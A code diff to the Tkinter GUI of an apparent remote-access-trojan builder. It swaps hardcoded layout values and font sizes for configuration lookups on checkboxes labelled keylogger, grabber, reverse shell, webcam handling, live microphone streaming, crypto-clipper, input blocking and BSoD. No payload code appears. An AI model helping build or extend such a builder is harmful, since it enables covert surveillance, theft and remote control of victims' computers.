@@ -598,14 +598,14 @@ class Builder:
         self.new_background(2)
         self.load_configuration(True)
 
-        x_start, y_start, x_delta, y_delta = 50, 50, 8, 35
+        x_start, y_start, x_delta, y_delta = builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['x_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['y_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['x_delta'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['y_delta']
 
         self.cbvar_keylogr = tk.BooleanVar(value=True)
         self.cb_keylogr = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
             text='keylogger',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_keylogr,
             
             onvalue=True,
@@ -621,7 +621,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='take screenshots',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_scrnsht,
             
             onvalue=True,
@@ -637,7 +637,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='file management',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_fmanag,
             
             onvalue=True,
@@ -653,7 +653,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='grabber',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_grabber,
             
             onvalue=True,
@@ -669,7 +669,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='stream live microphone',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_mclive,
             
             onvalue=True,
@@ -685,7 +685,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='24/7 microphone recording',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_mcrecc,
             
             onvalue=True,
@@ -701,7 +701,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='manage processes',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_process,
             
             onvalue=True,
@@ -717,7 +717,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='reverse shell',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_revshl,
             
             onvalue=True,
@@ -733,7 +733,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='webcam handling',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_webcam,
             
             onvalue=True,
@@ -749,7 +749,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='screen recording',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_scrnrec,
             
             onvalue=True,
@@ -765,7 +765,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='input blocking',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_inputbl,
             
             onvalue=True,
@@ -781,7 +781,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='crypto-clipper',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_crclipr,
             
             onvalue=True,
@@ -797,7 +797,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='messager',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_messger,
             
             onvalue=True,
@@ -813,7 +813,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='Text-to-Speech',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_txtspee,
             
             onvalue=True,
@@ -829,7 +829,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='audio controlling',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_audctrl,
             
             onvalue=True,
@@ -845,7 +845,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='monitors controlling',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_monctrl,
             
             onvalue=True,
@@ -861,7 +861,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='website blocking',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_webbloc,
             
             onvalue=True,
@@ -877,7 +877,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='jumpscare',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_jmpscar,
             
             onvalue=True,
@@ -893,7 +893,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='keystroke type',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_keystrk,
             
             onvalue=True,
@@ -909,7 +909,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='screen manipulation',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_scrnman,
             
             onvalue=True,
@@ -925,7 +925,7 @@ class Builder:
             self.canvas,
             selectcolor='#0A0A10',
             text='BSoD',
-            font=('Consolas', 12),
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_bluesod,
             
             onvalue=True,
